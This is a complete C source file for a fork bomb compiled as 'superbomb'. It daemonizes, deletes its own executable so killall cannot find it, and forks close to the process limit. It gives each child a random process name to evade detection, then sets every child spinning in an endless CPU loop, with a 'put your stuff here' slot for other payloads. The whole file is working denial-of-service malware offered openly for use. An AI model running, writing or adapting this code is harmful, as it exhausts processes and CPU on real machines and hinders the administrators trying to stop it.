/*
 *
 *                  USE ON YOUR OWN RISK!
 *
 *
 * cc -Wall -Wextra -std=c89 -o superbomb yafb.c
 * shell> ./superbomb
 */

#if defined(__linux__)
#include <sys/prctl.h>
#endif
#if defined(BSD)
#include <sys/types.h>
#endif
#include <limits.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <err.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <signal.h>


static void chprocname (char *, int);
static void payload (void);
static void sig_prepare (void);


int
main (int argc, char *argv[])
{
        char executable[PATH_MAX];
        pid_t cpid;
        int len, nlen;
        unsigned count;
        int i, k;
        struct timespec wtime;
        int nproc;
        struct rlimit rl;

        /* child fork sleep time */
        wtime.tv_sec = 0;
        wtime.tv_nsec = 100000000; /* 100 msec */

        /* daemonize */
        while ((cpid = fork ()) == -1)
                nanosleep (&wtime, NULL);
        if (cpid > 0)
                exit (EXIT_SUCCESS);
        if (chdir ("/") < 0)
                err (1, "chdir");

        /* killall(1) is looking for /proc/[pid]/exe */
        len = strlen (argv[0]);
        strncpy (executable, argv[0], len);
        unlink (executable);

        sig_prepare ();
        if (getrlimit (RLIMIT_NPROC, &rl) == -1)
                err (1, "rlimit");
        count = (unsigned)rl.rlim_max;
        count -= count / 20.0;
        while (count--) {
                while ((cpid = fork ()) == -1)
                        nanosleep (&wtime, NULL);
                srand ((unsigned)count);
                chprocname (argv[0], len);
                if (cpid > 0)
                        continue;
                payload ();
        }
        /* zerg! */
        kill (0, SIGUSR1);
        return 0;
}

static void
chprocname (char *argv0, int len)
{
        char next[256], temp[16], *p;
        int i, k, nlen;

        if ((p = malloc (sizeof (char))) == NULL)
                exit (EXIT_FAILURE);

        sprintf (temp, "%lx", (long unsigned)p);
        nlen = strlen (temp);
        free (p); /* prevent cow "hacks" */

        for (i = 0, k = rand () % 11; i < len; i++, k++) {
                if (k >= nlen)
                        k = 0;
                next[i] = temp[k];
        }
        next[i] = '\0';

#if defined(__linux__)
        /* /proc/[pid]/cmdline */
        strncpy (argv0, next, len);
        /* /proc/[pid]/comm */
        prctl (PR_SET_NAME, (unsigned long)next, 0, 0, 0);
#elif defined(__FreeBSD__)
        /* we are helpless there */
        setproctitle ("%s", next);
#else
        /* cmdline */
        strncpy (argv0, next, len);
#endif
}

static volatile sig_atomic_t sigflag;
static sigset_t newmask, oldmask, zeromask;

static void
sig_usr (int signo)
{
        sigflag = 1;
}

static void
sig_prepare (void)
{
        if (signal(SIGUSR1, sig_usr) == SIG_ERR)
                err (1, "signal");
        sigemptyset (&zeromask);
        sigemptyset (&newmask);
        sigaddset (&newmask, SIGUSR1);
        if (sigprocmask (SIG_BLOCK, &newmask, &oldmask) < 0)
                err (1, "sig_block");
}

static void
payload (void)
{
        long unsigned xxx = 0;

        while (sigflag == 0)
                sigsuspend (&zeromask);
        sigflag = 0;
        if (sigprocmask (SIG_SETMASK, &oldmask, NULL) < 0)
                err (1, "sig_setmask");
        setsid ();

        /* put your stuff here */
        while (1)
                xxx += rand ();
}
